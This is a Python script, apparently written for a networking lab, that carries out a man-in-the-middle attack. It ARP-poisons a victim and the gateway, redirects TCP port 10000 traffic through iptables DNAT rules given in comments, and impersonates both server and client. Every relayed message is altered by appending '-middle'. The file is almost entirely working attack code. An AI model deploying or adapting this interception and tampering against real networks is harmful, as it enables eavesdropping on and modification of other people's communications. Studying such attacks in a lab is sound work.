import sys
import arp
import threading
from scapy.all import *
from loguru import logger as logging

# commands needed on host
# sysctl -w net.ipv4.ip_forward=1
# iptables -t nat -A PREROUTING -s 198.7.0.1 -p tcp --dport 10000 -j DNAT --to-destination 198.7.0.3
# to remove the iptables option type
# iptables -t nat -D PREROUTING -s 198.7.0.1 -p tcp --dport 10000 -j DNAT --to-destination 198.7.0.3

logging.remove()
logging.add(sys.stdout, colorize=True, format="<level>{level.icon}</level> <level>{message}</level>", level="TRACE")

# logging.level(name='TRACE', icon='>', color='<magenta><bold>')
logging.level(name='INFO', icon='[~]', color='<cyan><bold>')
logging.level(name='WARNING', icon='[!]', color='<yellow><bold>')
logging.level(name='DEBUG', icon='[*]', color='<blue><bold>')
logging.level(name='ERROR', icon='[X]', color='<red><bold>')
logging.level(name='SUCCESS', icon='[#]', color='<green><bold>')


server = "198.7.0.2"
client = "172.7.0.2"
middle = "198.7.0.3"
router = "198.7.0.1"
message = b""

# variables for synchronization
handshake = False
client_ready = threading.Condition()
server_ready = threading.Condition()
handshake_done = threading.Condition()

# simulating a fake server for the client to connect to
def client_hijack():
    global message
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    fake_server = (middle, 10000)
    sock.bind(fake_server)
    sock.listen(5)
    
    # inpersonating the server
    try:
        while True:
            logging.info(f'Waiting for connections on {fake_server[0]}:{fake_server[1]}')
            conn, addr = sock.accept()
            logging.info(f"Handshake with {addr}")
            
            # informing the fake client to initiate a connection with the server
            with handshake_done:
                handshake_done.notify()
                
            try:
                while True:
                    data = conn.recv(1024)
                    logging.info(f'Message received: "{data}"')
                    

                    if not data:
                        message = None # no message received
                        with client_ready:
                            client_ready.notify() # notify the fake client
                        raise Exception() # stop connection
                    
                    message = data + b"-middle" # modifying the message

                    # notify the client that the message is ready
                    with client_ready:
                        client_ready.notify()
                    
                    # wait for the client to receive from server
                    with server_ready:
                        server_ready.wait()
                        
                    if message is None:
                        raise Exception() # no message received from server
                    
                    logging.info(f'Sending "{message.decode("utf-8")}" to the client...')
                    conn.send(message)

            except:
                logging.warning("Connection closed! (fake server)")
                conn.close()
    except Exception as e:
        logging.error(f"Exiting... (fake server)")
        sock.close()

# simulating a fake client to comunicate with the server
def server_hijack():
    global message
    port = 10000
    addr = server
    server_address = (addr, port)

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            try:
                # waiting to receive a handshake from the victim
                with handshake_done:
                    handshake_done.wait()

                logging.info("Initiating connection with the server...")
                sock.connect(server_address)
                logging.info(f'Handshake with {str(server_address)}')
            except:
                logging.warning("Connection closed!")
                sock.close()
                continue

            while True:
                try:
                    # waiting for the victim's message
                    with client_ready:
                        client_ready.wait()
                    
                    if message is None:
                        raise Exception("") # no message from victim
                        
                    logging.info(f'Sending "{message.decode("utf-8")}" to server...')
                    sock.send(message)
                    data = sock.recv(1024)
                    
                    if not data:
                        message = None # no message from the server
                        with server_ready:
                            server_ready.notify()
                        raise Exception("")
                                      
                    message = data + b"-middle" # modifing the message from server
                    logging.info(f'Received message: "{data}"')
                    
                    # notifying the client that the message is ready
                    with server_ready:
                        server_ready.notify()
                except Exception as e:
                    logging.warning("Connection closed! (fake client)")
                    break
            sock.close()
            
        except:
            logging.error("Exiting... (fake client)")
            sys.exit(0)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        logging.debug("Usage: {sys.argv[0]} router_ip victim_ip")
        sys.exit(0)
    
    router_ip = sys.argv[1]
    victim_ip = sys.argv[2]

    router_mac = arp.get_mac(router_ip)
    if (router_mac is None):
        logging.error("Unable to get MAC of default gateway.")
        sys.exit(0)
    victim_mac = arp.get_mac(victim_ip)
    if (victim_mac is None):
        logging.error("Unable to get MAC of victim.")
        sys.exit(0)

    logging.debug(f"Default Gateway MAC: {router_mac}")
    logging.debug(f"Victim MAC: {victim_mac}")

    attack_thread = threading.Thread(target=arp.arp_poison, args=(router_ip, router_mac, victim_ip, victim_mac))
    attack_thread.start()

    client_th = threading.Thread(target=client_hijack)
    server_th = threading.Thread(target=server_hijack)
    client_th.start()
    server_th.start()

